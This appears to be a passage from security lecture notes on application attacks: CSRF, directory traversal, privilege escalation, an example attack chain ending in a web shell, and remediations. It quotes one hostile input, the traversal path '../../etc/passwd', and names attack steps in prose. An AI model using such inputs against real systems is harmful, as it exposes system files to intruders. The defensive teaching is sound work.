3 A researcher clicks a link in an email; a specimen transfer is submitted on their behalf. Attack: CSRF. Failed control: CSRF token, SameSite cookie. Remediation: add CSRF token to all state-changing forms; set SameSite=Strict on session cookie.
4 The image viewer accepts a path parameter. Attacker submits ../../etc/passwd. Attack: Directory traversal. Failed control: path canonicalization. Remediation: resolve canonical path before access; verify it starts with the permitted base directory.
5 A standard researcher account accesses /admin/users/ by typing the URL directly. Attack: Broken access control (vertical privilege escalation). Failed control: server-side authorization on admin endpoints. Remediation: enforce authorization checks server-side on every request to privileged endpoints.

Attack Chain Analysis
Real attacks combine multiple vulnerabilities. No single class exists in isolation -- each opens the door for the next.
Example Full Attack Chain
Reflected XSS in a search parameter steals the admin's session cookie. Session cookie used to access the admin panel. Admin panel has an unrestricted file upload. Web shell uploaded. Web shell provides OS command execution. OS command execution reveals database credentials in a config file. Database accessed with credentials -- full data exfiltration. Each vulnerability alone was partially defended; chained, they were catastrophic.
Initial Access
The first vulnerability exploited to gain any foothold: SQLi bypassing auth, XSS stealing a session, a phishing link installing malware, an exposed admin panel with default credentials. Initial access determines the attacker's starting privilege level and the attack surface available for post-exploitation.
Lateral Movement and Escalation
From the initial foothold, the attacker expands: IDOR to access other accounts, privilege escalation to gain admin rights, SSRF to reach internal services, command injection to pivot to the OS. Defense in depth must break the chain at each step -- not just at initial access. Multiple independent barriers matter.
Defense in Depth Breaks Chains
Fix the XSS and the session cookie is never stolen. Set HttpOnly and the stolen cookie is useless. Remove unrestricted file upload and the web shell cannot be planted. Separate the web server from the database network and the credential theft has no path. Each independent fix breaks a link in the chain. Full chains only succeed when defenses are absent at every layer.

Module Summary
Application attacks exploit untrusted input, weak authorization, and memory safety failures. Every defense traces back to one principle: validate everything, trust nothing.
Every attack in this module exploits a gap between what the developer assumed about user input and what the attacker actually submitted. The fix in every case is: validate input rigorously, parameterize data operations, enforce authorization on every request, and apply output encoding for the correct context.
10 Facts to Carry Out of This Lecture
1 SQL injection: user input concatenated into SQL queries. Fix: parameterized queries and stored procedures. Database least privilege limits damage if exploitation succeeds.
2 XSS types: Stored (persisted in DB), Reflected (in URL/response), DOM-based (client-side only). Defense: output encoding per context, CSP headers, HttpOnly cookies.
3 CSRF forges requests from the victim's authenticated browser. Defense: CSRF tokens, SameSite=Strict cookies. XSS breaks CSRF token defenses -- fix XSS first.
4 Buffer overflows overwrite memory beyond allocated buffers. Defenses: ASLR (randomizes layout), DEP/NX (blocks execution), stack canaries (detects overwrite). Memory-safe languages eliminate the class.
5 Directory traversal uses ../ sequences to escape intended directories. Defense: canonicalize path, verify it starts with the allowed base directory, use chroot.
6 Vertical privilege escalation: low to high privilege. Horizontal: same privilege, different identity (IDOR). Both require server-side authorization checks on every object access.
7 WAFs are compensating controls and detection layers -- not a substitute for fixing application vulnerabilities. They are bypassed regularly; fix the code they are protecting.
8 SSRF exploits the server's ability to make outbound requests. Critical in cloud environments where metadata endpoints expose IAM credentials. Defense: URL allowlisting, block RFC 1918 and link-local ranges.
9 CVSS scores vulnerabilities 0-10. Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9). Combine CVSS with asset criticality and exploit availability for real-world prioritization.
10 Real attacks chain vulnerabilities. Defense in depth that breaks any single link in the chain prevents the full compromise. No single control is sufficient; independent layers at each tier are required.
